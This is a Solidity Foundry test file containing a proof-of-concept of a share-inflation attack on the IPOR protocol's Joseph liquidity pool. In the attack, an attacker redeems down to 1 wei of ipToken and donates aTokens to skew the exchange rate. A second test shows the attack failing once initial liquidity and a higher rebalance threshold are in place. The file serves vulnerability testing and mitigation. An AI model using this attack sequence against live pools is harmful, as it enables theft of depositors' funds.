// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/console2.sol";
import "../TestCommons.sol";
import {DataUtils} from "../utils/DataUtils.sol";
import {SwapUtils} from "../utils/SwapUtils.sol";
import "../utils/TestConstants.sol";
import "../../contracts/mocks/spread/MockSpreadModel.sol";
import "../../contracts/mocks/tokens/MockTestnetToken.sol";
import "../../contracts/tokens/IpToken.sol";
import "../../contracts/mocks/milton/MockCase0MiltonDai.sol";
import "../../contracts/mocks/milton/MockCase0MiltonUsdt.sol";
import "../../contracts/mocks/stanley/MockCase0Stanley.sol";
import "../../contracts/mocks/stanley/MockCase1Stanley.sol";
import "../../contracts/mocks/joseph/MockCase0JosephDai.sol";
import "../../contracts/mocks/joseph/MockCase0JosephUsdt.sol";
import "../../contracts/amm/MiltonStorage.sol";
import "../../contracts/itf/ItfIporOracle.sol";
import "../../contracts/interfaces/types/IporTypes.sol";
import "../../contracts/mocks/stanley/MockTestnetStrategy.sol";
import "../../contracts/libraries/Constants.sol";

contract JosephAttackPoC is TestCommons, DataUtils, SwapUtils {
    MockSpreadModel internal _miltonSpreadModel;
    MockTestnetToken internal _usdtMockedToken;
    MockTestnetToken internal _usdcMockedToken;
    MockTestnetToken internal _daiMockedToken;
    IpToken internal _ipTokenUsdt;
    IpToken internal _ipTokenUsdc;
    IpToken internal _ipTokenDai;

    function setUp() public {
        _usdtMockedToken = getTokenUsdt();
        _usdcMockedToken = getTokenUsdc();
        _daiMockedToken = getTokenDai();
        _ipTokenUsdt = getIpTokenUsdt(address(_usdtMockedToken));
        _ipTokenUsdc = getIpTokenUsdc(address(_usdcMockedToken));
        _ipTokenDai = getIpTokenDai(address(_daiMockedToken));
        _admin = address(this);
        _userOne = _getUserAddress(1);
        _userTwo = _getUserAddress(2);
        _userThree = _getUserAddress(3);
        _liquidityProvider = _getUserAddress(4);
        _users = usersToArray(_admin, _userOne, _userTwo, _userThree, _liquidityProvider);
        _miltonSpreadModel = prepareMockSpreadModel(
            TestConstants.ZERO,
            TestConstants.ZERO,
            TestConstants.ZERO_INT,
            TestConstants.ZERO_INT
        );
    }

    function testPoCAttackSuccesfull() public {
        // given
        IporProtocol memory iporProtocol = setupIporProtocolForDai();

        uint256 attackerPosition = 3_000 * 1e18;
        uint256 userPosition = 1_000_000 * 1e18;
        uint256 aTokenValue = 672_500 * 1e18;

        // setup autorebalance treshold to 1000
        iporProtocol.joseph.setAutoRebalanceThreshold(1);

        deal(address(iporProtocol.asset), address(_userOne), attackerPosition);
        deal(address(iporProtocol.asset), address(_userTwo), userPosition);

        deal(address(iporProtocol.asset), address(_liquidityProvider), 10 * 1e18);

        vm.prank(address(_userOne));
        iporProtocol.asset.approve(address(iporProtocol.joseph), attackerPosition);

        vm.prank(address(_userTwo));
        iporProtocol.asset.approve(address(iporProtocol.joseph), userPosition);

        vm.prank(address(_liquidityProvider));
        iporProtocol.asset.approve(address(iporProtocol.joseph), 10 * 1e18);

        // console2.log("NOW! INITIAL PROVIDE LIQUIDITY WHICH PROTECT POOL FROM ATTACK...");
        // vm.prank(address(_liquidityProvider));
        // iporProtocol.joseph.provideLiquidity(10 * 1e18);

        // attacker force rebalance in Stanley to create some ivToken
        // (without this transfer aTokens will not have any influence on exchange rate)
        vm.prank(address(_userOne));
        iporProtocol.joseph.provideLiquidity(attackerPosition);

        uint256 attackerIpTokenBalance_1 = iporProtocol.ipToken.balanceOf(address(_userOne));

        // attacker redeem to achieve 1 wei ipToken balance
        vm.prank(address(_userOne));
        iporProtocol.joseph.redeem(attackerIpTokenBalance_1 - 1);

        console2.log(
            "attacker ipToken balance after redeem: ",
            iporProtocol.ipToken.balanceOf(address(_userOne))
        );

        console2.log(
            "attacker erc20 balance after redeem: ",
            iporProtocol.asset.balanceOf(address(_userOne))
        );

        console2.log("ipToken TotalSupply:", iporProtocol.ipToken.totalSupply());

        address aaveStrategy = iporProtocol.stanley.getStrategyAave();

        // BEGIN - Simulation when attacker transfer aTokens to AAVE for Stanley address
        MockTestnetStrategy(aaveStrategy).setStanley(_admin);
        iporProtocol.asset.approve(aaveStrategy, aTokenValue);
        MockTestnetStrategy(aaveStrategy).deposit(aTokenValue);
        MockTestnetStrategy(aaveStrategy).setStanley(address(iporProtocol.stanley));
        // END - Simulation when attacker transfer aTokens to AAVE for Stanley address

		console2.log("getMaxLiquidityPoolBalance: ", iporProtocol.joseph.getMaxLiquidityPoolBalance());
		console2.log("getMaxLpAccountContribution: ", iporProtocol.joseph.getMaxLpAccountContribution());
        // user provide liquidity
        vm.prank(address(_userTwo));
        iporProtocol.joseph.provideLiquidity(userPosition);

        uint256 attackerIpTokenBalance_2 = iporProtocol.ipToken.balanceOf(address(_userOne));
        console2.log("attackerIpTokenBalance: ", attackerIpTokenBalance_2);

        uint256 userIpTokenBalance = iporProtocol.ipToken.balanceOf(address(_userTwo));
        console2.log("userIpTokenBalance: ", userIpTokenBalance);

        //user redeem
        vm.prank(address(_userTwo));
        iporProtocol.joseph.redeem(userIpTokenBalance);

        // attacker redeem
        vm.prank(address(_userOne));
        iporProtocol.joseph.redeem(attackerIpTokenBalance_2);

        console2.log("SUMMARY:");

        console2.log("user balance:");
        int256 userBalance = int256(iporProtocol.asset.balanceOf(address(_userTwo))) -
            int256(userPosition);
        console.logInt(userBalance);
        console.logInt(IporMath.divisionInt(userBalance, Constants.D18_INT));

        console2.log("attacker balance:");

        int256 attackerBalance = int256(iporProtocol.asset.balanceOf(address(_userOne))) -
            int256(attackerPosition + aTokenValue);

        console.logInt(attackerBalance);
        console.logInt(IporMath.divisionInt(attackerBalance, Constants.D18_INT));

        console2.log(
            "AMM liquidity pool balance:",
            iporProtocol.milton.getAccruedBalance().liquidityPool
        );
        console2.log(
            "AMM liquidity pool balance:",
            IporMath.division(iporProtocol.milton.getAccruedBalance().liquidityPool, Constants.D18)
        );
    }

    function testPoCAttackFailed() public {
        // given
        IporProtocol memory iporProtocol = setupIporProtocolForDai();

        uint256 attackerPosition = 3_000 * 1e18;
        uint256 userPosition = 1_000_000 * 1e18;
        uint256 aTokenValue = 672_500 * 1e18;

        // setup autorebalance treshold to 1000
        iporProtocol.joseph.setAutoRebalanceThreshold(1000);

        deal(address(iporProtocol.asset), address(_userOne), attackerPosition);
        deal(address(iporProtocol.asset), address(_userTwo), userPosition);

        deal(address(iporProtocol.asset), address(_liquidityProvider), 10 * 1e18);

        vm.prank(address(_userOne));
        iporProtocol.asset.approve(address(iporProtocol.joseph), attackerPosition);

        vm.prank(address(_userTwo));
        iporProtocol.asset.approve(address(iporProtocol.joseph), userPosition);

        vm.prank(address(_liquidityProvider));
        iporProtocol.asset.approve(address(iporProtocol.joseph), 10 * 1e18);

        // console2.log("NOW! INITIAL PROVIDE LIQUIDITY WHICH PROTECT POOL FROM ATTACK...");
        vm.prank(address(_liquidityProvider));
        iporProtocol.joseph.provideLiquidity(10 * 1e18);

        // attacker force rebalance in Stanley to create some ivToken
        // (without this transfer aTokens will not have any influence on exchange rate)
        vm.prank(address(_userOne));
        iporProtocol.joseph.provideLiquidity(attackerPosition);

        uint256 attackerIpTokenBalance_1 = iporProtocol.ipToken.balanceOf(address(_userOne));

        // attacker redeem to achieve 1 wei ipToken balance
        vm.prank(address(_userOne));
        iporProtocol.joseph.redeem(attackerIpTokenBalance_1 - 1);

        console2.log(
            "attacker ipToken balance after redeem: ",
            iporProtocol.ipToken.balanceOf(address(_userOne))
        );

        console2.log(
            "attacker erc20 balance after redeem: ",
            iporProtocol.asset.balanceOf(address(_userOne))
        );

        console2.log("ipToken TotalSupply:", iporProtocol.ipToken.totalSupply());

        address aaveStrategy = iporProtocol.stanley.getStrategyAave();

        // BEGIN - Simulation when attacker transfer aTokens to AAVE for Stanley address
        MockTestnetStrategy(aaveStrategy).setStanley(_admin);
        iporProtocol.asset.approve(aaveStrategy, aTokenValue);
        MockTestnetStrategy(aaveStrategy).deposit(aTokenValue);
        MockTestnetStrategy(aaveStrategy).setStanley(address(iporProtocol.stanley));
        // END - Simulation when attacker transfer aTokens to AAVE for Stanley address

        // user provide liquidity
        vm.prank(address(_userTwo));
        iporProtocol.joseph.provideLiquidity(userPosition);

        uint256 attackerIpTokenBalance_2 = iporProtocol.ipToken.balanceOf(address(_userOne));
        console2.log("attackerIpTokenBalance: ", attackerIpTokenBalance_2);

        uint256 userIpTokenBalance = iporProtocol.ipToken.balanceOf(address(_userTwo));
        console2.log("userIpTokenBalance: ", userIpTokenBalance);

        //user redeem
        vm.prank(address(_userTwo));
        iporProtocol.joseph.redeem(userIpTokenBalance);

        // attacker redeem
        vm.prank(address(_userOne));
        iporProtocol.joseph.redeem(attackerIpTokenBalance_2);

        console2.log("SUMMARY:");

        console2.log("user balance:");
        int256 userBalance = int256(iporProtocol.asset.balanceOf(address(_userTwo))) -
            int256(userPosition);
        console.logInt(userBalance);
        console.logInt(IporMath.divisionInt(userBalance, Constants.D18_INT));

        console2.log("attacker balance:");

        int256 attackerBalance = int256(iporProtocol.asset.balanceOf(address(_userOne))) -
            int256(attackerPosition + aTokenValue);

        console.logInt(attackerBalance);
        console.logInt(IporMath.divisionInt(attackerBalance, Constants.D18_INT));

        console2.log(
            "AMM liquidity pool balance:",
            iporProtocol.milton.getAccruedBalance().liquidityPool
        );
        console2.log(
            "AMM liquidity pool balance:",
            IporMath.division(iporProtocol.milton.getAccruedBalance().liquidityPool, Constants.D18)
        );
    }
}
